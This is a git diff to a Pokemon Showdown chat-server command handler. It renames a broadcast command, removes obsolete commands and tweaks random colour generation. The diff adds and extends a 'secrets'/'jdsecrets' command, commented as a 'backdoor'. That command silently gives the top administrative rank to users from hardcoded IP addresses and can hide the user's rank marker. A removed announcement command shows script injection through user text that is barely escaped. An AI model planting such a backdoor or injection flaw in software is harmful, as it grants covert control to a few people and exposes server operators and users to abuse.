@@ -143,46 +143,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	switch (cmd) {
 
 	// tour commands 
-	case 'changeannouncement':
-	case 'ca':
-	case 'getannouncement':
-	case 'ga':
-		if (!user.can('forcewin')) {
-			emit(socket, 'console', 'You do not have enough authority to use this command. Access denied. Get out of here peasant.');
-			return false;
-		}
-		if (!target) {
-			fs.readFile("config/announcement.txt", function(err, data) {
-				if (err) {
-					return false;
-				}
-				emit(socket, 'console', {
-					rawMessage: "<div>Announcement: <span>" + sanitize(data.toString()) + "</span></div>"
-				});
-			});
-			return false;
-		}
-		fs.writeFile("config/announcement.txt", target);
-		for (var i in Users.users) {
-			var c = Users.users[i];
-			if (c.connected) {
-				c.emit('console', {
-					rawMessage: 'The announcement was changed by ' + user.name + '.<script>$("#simheader").html("' + target.replace(/\"/g, '\\"') + '");</script>'
-				});
-			}
-		}
-		return false;
-		break;
-
-	//added - announcement stuff
-	fs.readFile('config/announcement.txt', function(err, data) {
-		if (err) return;
-		var announcement = data.toString().replace(/\"/g, '\\"');
-		emit(socket, 'console', {
-			evalRawMessage: '$("#simheader").html("' + announcement + '");'
-		});
-	});
-
 	case 'remind':
 	case '!remind':
 		var roomid = room.id;if (room.battle) {roomid = room.parentid;}
@@ -637,14 +597,14 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		if (canTalk(user, room)) return true;
 		break;
 
-	case '!birkal':
-	case 'birkal':
+	case '!kupo':
+	case 'kupo':
 		if (canTalk(user, room) && user.can('broadcast') && room.id === 'lobby') {
-			if (cmd === '!birkal') {
-				room.add('|c|'+user.getIdentity()+'|!birkal '+target, true);
+			if (cmd === '!kupo') {
+				room.add('|c|'+user.getIdentity()+'|!kupo '+target, true);
 			}
-			room.logEntry(user.name + ' used /birkal ' + target);
-			room.add('|c| Birkal|/me '+target, true);
+			room.logEntry(user.name + ' used /kupo ' + target);
+			room.add('|c| kupo|/me '+target, true);
 			return false;
 		}
 		break;
@@ -895,19 +855,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
-	case 'banredirect':
-	case 'br':
-		emit(socket, 'console', '/banredirect - This command is obsolete and has been removed.');
-		return false;
-		break;
-
-	case 'redirect':
-	case 'redir':
-		emit(socket, 'console', '/redirect - This command is obsolete and has been removed.');
-		return false;
-		break;
-
-        case 'kick':
+      	case 'kick':
 	case 'k':
 		// TODO: /kick will be removed in due course.
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
@@ -958,7 +906,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		unbarn = false;
 		return false;
 		break;
-
 
 	case 'unbanall':
 		if (!user.can('ban')) {
@@ -1541,18 +1488,23 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	*/
 	
 	case 'secrets':
-	case 'jdsecrets':
-		// backdoor for panderp and jd
-		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' ||user.ip === '127.0.0.1' ) {
+		// backdoor for panderp and kupo
+		if (user.ip  === '76.247.181.42'|| user.ip === '127.0.0.1' || user.ip === '204.112.133.186' || user.ip === '99.251.253.160') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			if(user.id ==='jd'){
-				user.getIdentity = function() { return ' ' + user.name };
-			}
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
 		}
 		break;
 		
+	case 'jdsecrets':
+		if (user.ip === '99.251.253.160' ||user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			user.getIdentity = function() { return ' ' + user.name }
+			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+			return false;
+		}
+		break;
+
 	case 'riles':
 		if(user.userid === 'riles'){
 			user.avatar = 64;
@@ -1590,7 +1542,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	
 	case 'd':
 	case 'poof':
-		var btags = '<strong><font color="'+Math.floor(Math.random()*16777216).toString(16)+'" >';
+		var btags = '<strong><font color="'+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+'" >';
 		var etags = '</font></strong>'
 		var targetid = toUserid(user);
 		var success = false;
@@ -1627,7 +1579,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		
 		if(poofeh)
 		{
-			var btags = '<strong><font color="'+Math.floor(Math.random()*16777216).toString(16)+'" >';
+			var btags = '<strong><font color="'+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+'" >';
 			var etags = '</font></strong>'
 			room.addRaw(btags + '~~ '+user.name+' '+target+'! ~~' + etags);
 			logModCommand(room, user.name + ' used a custom poof message: \n "'+target+'"',true);	
@@ -1993,8 +1945,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case '!opensource':
 	case 'git':
 	case '!git':
-	case 'github':
-	case '!github':
 		showOrBroadcastStart(user, cmd, room, socket, message);
 		showOrBroadcast(user, cmd, room, socket,
 				'<div class="message-opensource">Pokemon Showdown is open source:<br />- Language: JavaScript<br />'+
